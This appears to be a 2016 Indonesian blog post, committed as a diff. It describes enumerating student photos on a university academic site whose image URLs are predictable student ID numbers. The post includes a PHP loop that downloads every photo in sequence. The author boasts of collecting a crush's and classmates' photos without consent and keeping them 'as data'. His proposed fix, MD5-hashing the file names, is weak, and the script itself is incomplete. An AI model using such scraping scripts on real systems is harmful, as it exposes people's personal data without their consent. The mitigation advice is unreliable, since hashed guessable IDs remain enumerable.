@@ -1,0 +1,60 @@
+---
+layout: post
+status: publish
+disqus: y 
+share: y 
+publish: y
+title: Tebak Tebak Berhadiah
+author: dika
+wordpress_id: 652
+wordpress_url: http://blog.dika.web.id/?p=652
+date: '2016-02-06 12:02:53 +0700'
+date_gmt: '2016-02-06 05:02:53 +0700'
+categories:
+- Tips & Trik
+tags:
+- UUID
+comments: []
+---
+<p>Assalamualaikum, selamat pagi kawan.. baru nulis lagi nih sekarang, karena baru ada waktu dan kesehatan yang sedang membaik.. Oh iya, ini soal tentang nyari <span class="spoiler"><del>doi</del></span> poto-poto angkatan di website akademik di kampusku. Selagi server websitenya belum di tutup kembali, ane <del>colong</del> ambil foto <span class="spoiler">doi</span> yang saya cari sejak pertama ketemu di kampus xD. Mungkin ini sedikit saran atau bukan, saya tidak tahu. :D</p>
+<p><!--more--></p>
+<p>Mungkin juga kasus seperti ini sudah pernah di bahas dan diketahui oleh kaka tingkat sebelum saya. Itung itung menambah postingan artikel ini saya repost kembali dan di hubungkan dengan implementasi nyolong gambar <span class="spoiler">doi</span>. Sudah lama saya pernah singgah dan membaca tentang <strong>Menggunakan UUID (Universally Unique Identifier)</strong> pada blog <a href="http://id-laravel.com" target="_blank">Laravel Indonesia</a> yang di tulis oleh mas <a href="http://yohang.net" target="_blank">Yoga</a>.</p>
+<p>Nah apa hubungannya nyari foto sama UUID? UUID pada postingan nya mas yohang kan hanya untuk primary id? sedangkan yang saya bahas menggunakan nim. Eitss santai dulu, tapi disini saya menemukan problem yang hampir sama yaitu :</p>
+<h4 id="problem-1-tebak-tebak-berhadiah">Problem : Tebak-Tebak Berhadiah</h4>
+<p>Dalam tebak tebak berhadiah ini, kita dapat menyusuri satu satu berdasarkan kode jurusan dan nomor absennya. Nah bagaimana caranya? kok bisa? tentu bisa!</p>
+<p>Disini saya mendapat alamat URL foto saya dengan URL sebagai berikut :</p>
+<blockquote>http://akademik.****.ac.id/foto/1515240**.JPG</blockquote>
+<p>Nah kita bisa lihat, url dengan sehabis path foto itu adalah nim kita yang tidak di enkripsi.</p>
+<p>Karena saya penasaran, dan mungkin pengen iseng liat foto foto <span class="spoiler"><del>doi</del></span> eh maksudnya foto foto gak kobe nya temen. Saya nyoba melooping url tersebut dan membuat sebuah kode seperti ini :</p>
+
+{% highlight php startinline=true %}
+<?php
+for($i=1;$i<=$baris;$i++){
+	$i = ($i<10)? "0".$i : $i; // kalo satu digit
+	nyimpen(substr($ngambilNim,0,7).$i); // manggil fungsi nyimpen
+}
+
+// Anonymous function
+function nyimpen($nim){
+	/* Url dari server */
+	$url = "http://akademik.****.ac.id/foto/".$nim.'.JPG';
+	/* File baru di simpen ke lokal in */
+	$ngaran = $nim.'.jpg';
+	/* Nyalin file ti server liwat url ka lokal */
+	$copy = copy($url, $ngaran);
+	/* Status */
+	if(!$copy ) {
+		echo "Pirakuu! gagal \n";
+	}else{
+		echo "Mantap jiwaaa! $nim.jpg sukses disimpen kawan\n";
+	}
+}
+{% endhighlight %}
+
+<p>Dengan <em>script</em> sederhana seperti di atas, Saya mendapatkan semua data-data foto temen hanya dalam waktu singkat saja.</p>
+<p>Nah bagaimana dengan cara menanganinya dari orang-orang yang tidak bertanggung jawab?</p>
+<p>Untuk solusinya ketika menyimpan gambar, kita harus mengenkripsi file nama yang akan di simpan pada database bisa dengan teknik <em>encryption </em>atau bisa juga dengan <em>hashing</em>. :D</p>
+<p>Disini saya mengambil contoh dengan menggunakan md5 hash bawaan php. Jadi nanti URL yang setelah di hash menggunakan hash MD5 akan seperti ini contohnya :</p>
+<blockquote><p>http://akademik.****.ac.id/foto/3dab9fc93c5037141c4bf728e1e48169.JPG</p></blockquote>
+<p>Nah untuk lihat hasil yang saya dapat, saya dapet foto foto temen kelas, dan lumayan bisa di jadikan data nanti ketika butuh.</p>
+<p><a href="{{site.url}}/wp-content/uploads/2016/02/Screenshot-Studio-capture-50.png"><img class="aligncenter wp-image-655 size-large" src="http://blog.dika.web.id/wp-content/uploads/2016/02/Screenshot-Studio-capture-50-1024x456.png" alt="Screenshot Studio capture #50" width="560" height="249" /></a>Terima kasih telah menyimak dan berkunjung ke catatan mini saya, jangan sungkan sungkan untuk kembali ya.. Arigatouuu ^_^</p>
